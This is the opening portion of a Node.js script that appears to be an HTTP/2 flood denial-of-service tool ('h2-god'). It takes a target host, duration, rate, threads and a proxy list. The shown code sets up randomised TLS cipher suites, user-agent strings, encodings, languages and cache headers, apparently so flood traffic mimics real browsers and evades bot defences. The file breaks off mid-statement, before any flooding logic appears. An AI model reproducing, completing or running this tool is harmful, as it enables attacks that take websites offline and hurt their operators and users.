const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
const colors = require("colors");

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

if (process.argv.length < 7) {
    console.log(`Usage: node h2-god Host time Rate Thread ProxyFile`);
    process.exit(1);
}

// Custom Cipher List untuk TLS
const cipherList = [
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "AES128-GCM-SHA256",
    "AES256-GCM-SHA384",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES",
    "DHE-RSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384",
    "DHE-RSA-AES128-SHA256",
    "DHE-RSA-AES256-SHA256",
    "DHE-RSA-CHACHA20-POLY1305",
    "DHE-DSS-AES128-GCM-SHA256",
    "DHE-DSS-AES256-GCM-SHA384",
    "DHE-DSS-AES128-SHA256",
    "DHE-DSS-AES256-SHA256",
    "RSA-AES128-GCM-SHA256",
    "RSA-AES256-GCM-SHA384",
    "RSA-AES128-SHA256",
    "RSA-AES256-SHA256",
    "ECDHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES256-SHA384",
    "ECDHE-ECDSA-AES128-SHA",
    "ECDHE-ECDSA-AES256-SHA",
    "AES128-SHA256",
    "AES256-SHA256",
    "AES128-SHA",
    "AES256-SHA",
    "CAMELLIA128-SHA",
    "CAMELLIA256-SHA",
    "DES-CBC3-SHA",
    "ECDHE-RSA-CAMELLIA128-SHA256",
    "ECDHE-RSA-CAMELLIA256-SHA384",
    "ECDHE-ECDSA-CAMELLIA128-SHA256",
    "ECDHE-ECDSA-CAMELLIA256-SHA384"
];

const userAgents = [
    // Google Chrome (Windows, Mac, Linux, Android)
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
    'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
    'Mozilla/5.0 (Linux; Android 11; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.85.1 YaSearchBrowser/21.85.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.3.940 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)',
    'Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 OPR/70.0.3728.178',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.740 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.116 YaApp_Android/22.11.1 YaSearchBrowser/22.11.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 11; RMX3201 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 OPR/78.0.4093.186',
    'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; HRY-LX1 Build/HONORHRY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.5.121.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.11.7.183.10 SA/3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.742 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.113.1 YaSearchBrowser/21.113.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 YaApp_Android/21.80.1 YaSearchBrowser/21.80.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.8.3.966.10 SA/3 TA/2.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 8.0.0; BV6800Pro_RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/19.5.2.38.10 YaApp_iOS/87.00 YaApp_iOS_Browser/87.00 Safari/604.1 SA/3 TA/2.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.727 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.82.1 YaSearchBrowser/21.82.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; Lenovo K12 Pro Build/RZCS31.Q2-57-12-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 Instagram 210.0.0.28.71 Android (30/11; 280dpi; 720x1526; lenovo/Lenovo; Lenovo K12 Pro; cebu; qcom; ru_RU; 326153491)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 YaBrowser/21.6.1.274 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.172 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.56.1 YaSearchBrowser/21.56.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.740 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.730 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaBrowser/21.5.3.120.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-N980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 YaBrowser/21.6.6.55.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 9; ZB602KL Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; M2010J19SG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.114.1 YaSearchBrowser/21.114.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.0.1996 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.51.1 YaSearchBrowser/21.51.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MagnitApp_iOS/2.0.9',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.54.1 YaSearchBrowser/21.54.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.620 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 YaApp_Android/21.80.1 YaSearchBrowser/21.80.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm; Android 10; AQM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 YaBrowser/21.8.1.138.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MagnitApp_iOS/1.4.9',
    'Mozilla/5.0 (Linux; arm; Android 10; AKA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.117.1 YaSearchBrowser/21.117.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaBrowser/21.5.4.119.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 YaBrowser/21.8.1.127.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 YaBrowser/21.6.1.274 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.616 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0; CHM-U01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36'
];

const acceptEncodings = [
  "gzip, deflate, br",
  "gzip, deflate",
  "br",
  "gzip",
  "deflate",
  "identity",
  "compress",
  "gzip, compress",
  "gzip, deflate, compress",
  "gzip, br",
  "deflate, br",
  "compress, br",
  "gzip, deflate, br, identity",
  "gzip, deflate, identity",
  "gzip, br, identity",
  "deflate, br, identity",
  "compress, br, identity",
  "gzip, deflate, br, compress, identity",
  "gzip, x-gzip",
  "compress, x-compress",
  "x-gzip, br",
  "x-compress, br",
  "gzip, deflate, br, x-gzip",
  "gzip, deflate, br, x-compress",
  "gzip, deflate, br, compress, x-gzip",
  "gzip, deflate, br, compress, x-compress",
  "gzip, deflate, br, x-gzip, x-compress",
  "gzip, deflate, br, compress, identity, x-gzip, x-compress",
  "gzip, deflate, br, x-gzip, x-compress, identity",
  "gzip, deflate, br, x-gzip, x-compress, identity, compress",
  "gzip, deflate, br, x-gzip, x-compress, identity, compress, deflate"
];
const acceptLanguages = [
  "en-US,en;q=0.9", // Inggris
  "fr-FR,fr;q=0.9", // Prancis
  "de-DE,de;q=0.8", // Jerman
  "es-ES,es;q=0.8", // Spanyol
  "it-IT,it;q=0.8", // Italia
  "pt-PT,pt;q=0.8", // Portugis
  "nl-NL,nl;q=0.7", // Belanda
  "ru-RU,ru;q=0.7", // Rusia
  "ja-JP,ja;q=0.7", // Jepang
  "zh-CN,zh;q=0.7", // Mandarin (Sederhana)
  "zh-TW,zh;q=0.7", // Mandarin (Tradisional)
  "ko-KR,ko;q=0.7", // Korea
  "ar-SA,ar;q=0.6", // Arab
  "tr-TR,tr;q=0.6", // Turki
  "pl-PL,pl;q=0.6", // Polandia
  "sv-SE,sv;q=0.6", // Swedia
  "da-DK,da;q=0.6", // Denmark
  "fi-FI,fi;q=0.6", // Finlandia
  "no-NO,no;q=0.6", // Norwegia
  "hu-HU,hu;q=0.5", // Hongaria
  "cs-CZ,cs;q=0.5", // Ceko
  "el-GR,el;q=0.5", // Yunani
  "he-IL,he;q=0.5", // Ibrani
  "th-TH,th;q=0.5", // Thailand
  "id-ID,id;q=0.5", // Indonesia
  "ms-MY,ms;q=0.5", // Malaysia
  "vi-VN,vi;q=0.5", // Vietnam
  "hi-IN,hi;q=0.5", // Hindi
  "bn-BD,bn;q=0.4", // Bengali
  "uk-UA,uk;q=0.4", // Ukraina
  "ro-RO,ro;q=0.4", // Rumania
  "bg-BG,bg;q=0.4", // Bulgaria
  "hr-HR,hr;q=0.4", // Kroasia
  "lt-LT,lt;q=0.4", // Lituania
  "lv-LV,lv;q=0.4", // Latvia
  "et-EE,et;q=0.4", // Estonia
  "sl-SI,sl;q=0.4", // Slovenia
  "sk-SK,sk;q=0.4", // Slovakia
  "sr-RS,sr;q=0.4", // Serbia
  "fa-IR,fa;q=0.4", // Persia (Farsi)
  "ur-PK,ur;q=0.4", // Urdu
  "pa-IN,pa;q=0.4", // Punjabi
  "ta-IN,ta;q=0.4", // Tamil
  "te-IN,te;q=0.4", // Telugu
  "mr-IN,mr;q=0.4", // Marathi
  "kn-IN,kn;q=0.4", // Kannada
  "ml-IN,ml;q=0.4", // Malayalam
  "gu-IN,gu;q=0.4", // Gujarati
  "si-LK,si;q=0.4", // Sinhala
  "my-MM,my;q=0.4", // Burma (Myanmar)
  "km-KH,km;q=0.4", // Khmer (Kamboja)
  "lo-LA,lo;q=0.4", // Lao
  "am-ET,am;q=0.3", // Amharic (Etiopia)
  "sw-KE,sw;q=0.3", // Swahili
  "so-SO,so;q=0.3", // Somali
  "yo-NG,yo;q=0.3", // Yoruba
  "ig-NG,ig;q=0.3", // Igbo
  "ha-NE,ha;q=0.3", // Hausa
  "zu-ZA,zu;q=0.3", // Zulu
  "xh-ZA,xh;q=0.3", // Xhosa
  "af-ZA,af;q=0.3", // Afrikaans
  "st-ZA,st;q=0.3", // Sesotho
  "tn-BW,tn;q=0.3", // Setswana
  "bs-BA,bs;q=0.3", // Bosnia
  "mk-MK,mk;q=0.3", // Makedonia
  "mn-MN,mn;q=0.3", // Mongolia
  "tg-TJ,tg;q=0.3", // Tajik
  "ky-KG,ky;q=0.3", // Kirgiz
  "uz-UZ,uz;q=0.3", // Uzbek
  "kk-KZ,kk;q=0.3", // Kazakh
  "ps-AF,ps;q=0.3", // Pashto
  "dv-MV,dv;q=0.3", // Dhivehi (Maladewa)
  "dz-BT,dz;q=0.3", // Dzongkha (Bhutan)
  "ne-NP,ne;q=0.3", // Nepali
  "bo-CN,bo;q=0.3", // Tibet
  "ug-CN,ug;q=0.3", // Uighur
  "yi-YD,yi;q=0.3", // Yiddish
  "tl-PH,tl;q=0.3", // Tagalog
  "ceb-PH,ceb;q=0.3", // Cebuano
  "hmn-US,hmn;q=0.3" // Hmong
];

const cacheControls = [
    "no-cache",
    "no-store",
    "max-age=0",
    "must-revalidate",
    "public, max-age=31536000",
    "private, max-age=86400",
    "s-maxage=600",
    "proxy-revalidate",
    "immutable",
    "stale-while-revalidate=120",
    "stale-if-error=86400",
    "no-transform",
    "only-if-cached"
];

const sigalgs = [
       'ecdsa_secp256r1_sha256',
       'ecdsa_secp384r1_sha384',
       'ecdsa_secp521r1_sha512',
       'rsa_pss_rsae_sha256',
       'rsa_pss_rsae_sha384',
       'rsa_pss_rsae_sha512',
       'rsa_pkcs1_sha256',
       'rsa_pkcs1_sha384',
       'rsa_pkcs1_sha512',
] 
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";"GREASE:X25519:x25519";
const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
